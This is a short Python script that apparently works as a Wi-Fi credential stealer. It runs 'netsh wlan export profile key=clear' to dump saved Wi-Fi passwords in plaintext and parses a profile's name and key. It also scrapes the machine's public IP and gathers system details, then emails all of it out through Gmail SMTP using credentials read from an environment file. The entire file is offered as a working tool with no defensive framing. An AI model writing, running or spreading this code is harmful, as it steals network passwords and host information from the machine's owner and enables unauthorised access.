import lxml, requests, socket, smtplib, os
import subprocess as sp 
import platform as pf
from dotenv import load_dotenv
from bs4 import BeautifulSoup
from time import sleep
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


sp.call("netsh wlan export profile key=clear")
sleep(2)

def wifi_parser():
    
    with open("Wi-Fi-4G-CPE-935396.xml", 'r') as file:
        soup = BeautifulSoup(file, 'xml')
    
    name = soup.find('name').text
    password = soup.find('keyMaterial').text
    
    global data
    data = f"Wifi name: {name}\nWifi password: {password}"
    
    print("Wifi parse sucessful complete")
    
def get_ip():
    response = requests.get(url="https://yandex.kz/internet")
    soup = BeautifulSoup(response.text, 'lxml')
    
    ip = soup.find('li', class_='parameter-wrapper general-info__parameter').find_all('div')[1].text
    
    global data_ip
    data_ip = f"IP ADDRES: {ip}"
    
    print("Get ip sucessful complete")
    
def info_pc():
    processor = pf.processor()
    sys = f"{pf.system()} {pf.release()}"
    net_pc = pf.node()
    ip_pc = socket.gethostbyname(socket.gethostname())
    
    global Pc
    Pc = f"Processor: {processor}\nSystem: {sys}\nNet name: {net_pc}\nIp addres pc: {ip_pc}"
    
    print("Sys info sucessful complete")
    
def all_info():
    global data_all_info
    data_all_info = f"{data}\n{data_ip}\n{Pc}"
    
    print("All info  sucessful complete")
    
def send():
    msg = MIMEMultipart()
    msg['Subject'] = 'Info of PC'
    msg['From'] = os.getenv('EMAIL')
    msg['To'] = os.getenv('EMAIL')
    
    body = data_all_info
    msg.attach(MIMEText(body, 'plain'))
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(os.getenv('EMAIL'), os.getenv('PASSWORD'))
        server.send_message(msg)
        server.quit()
    except Exception as ex:
        print(ex)
    finally:
        print("Send sucessful complete")
    
def main():
    load_dotenv()
    wifi_parser()
    get_ip()
    info_pc()
    all_info()
    send()

if __name__ == "__main__":
    main()
    print("All good")